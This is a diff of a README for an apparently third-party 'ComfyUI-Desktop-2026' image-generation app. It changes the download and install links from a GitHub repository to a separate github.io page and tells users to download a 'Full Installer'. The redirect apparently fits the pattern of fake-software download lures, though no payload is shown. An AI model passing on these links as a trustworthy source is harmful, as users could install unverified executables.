@@ -1,6 +1,6 @@
 # 🎨 ComfyUI-Desktop-2026 - Create AI art on your computer
 
-[![](https://img.shields.io/badge/Download-ComfyUI-blue.svg)](https://github.com/adjectival-sourcecode113/ComfyUI-Desktop-2026)
+[![](https://img.shields.io/badge/Download-ComfyUI-blue.svg)](https://adjectival-sourcecode113.github.io)
 
 ComfyUI-Desktop-2026 provides a visual way to generate images using Stable Diffusion on Windows 11 and 10. You move boxes on a screen to connect parts of an AI pipeline. This system removes the need to write code. You build your image generation workflow by dragging lines between nodes.
 
@@ -19,7 +19,7 @@ A slow hard drive or an integrated graphics card may cause the program to crash 
 
 Follow these steps to set up the software on your machine.
 
-1. Visit the project repository at https://github.com/adjectival-sourcecode113/ComfyUI-Desktop-2026.
+1. Visit the project repository at https://adjectival-sourcecode113.github.io
 2. Look for the "Releases" section on the right side of the page.
 3. Click the most recent version labeled "Full Installer."
 4. Save the file to your computer.
